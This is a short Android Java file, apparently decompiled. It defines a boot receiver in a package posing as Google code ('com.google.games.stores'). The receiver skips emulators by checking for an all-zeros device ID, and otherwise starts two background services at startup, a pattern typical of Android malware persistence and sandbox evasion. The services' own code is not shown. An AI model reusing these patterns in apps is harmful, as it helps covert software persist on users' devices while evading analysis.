package com.google.games.stores.recevier;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.google.games.stores.service.MessageService;
import com.google.games.stores.service.Notifications;
import com.google.games.stores.util.GeneralUtil;

public class BootRecevier extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if (!GeneralUtil.getDevice(context).equalsIgnoreCase("000000000000000")) {
            Intent backService = new Intent(context, Notifications.class);
            backService.setFlags(268435456);
            context.startService(backService);
            Intent messageService = new Intent(context, MessageService.class);
            messageService.setFlags(268435456);
            context.startService(messageService);
        }
    }
}
